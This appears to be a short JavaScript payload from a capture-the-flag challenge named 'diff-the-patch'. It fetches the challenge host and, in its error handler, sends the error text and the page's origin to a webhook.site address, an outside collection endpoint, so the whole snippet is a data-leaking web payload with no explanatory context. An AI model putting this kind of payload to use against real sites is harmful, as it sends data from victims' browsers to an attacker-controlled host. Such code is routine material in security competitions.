try{
  var a = await fetch("https://1bba152fa531f3b03766f402-1024-diff-the-patch.challenge.master.camp.allesctf.net:31337/")
}catch(err){
  await  fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?"+err+document.location.origin,{"mode":"cors"});
}
  
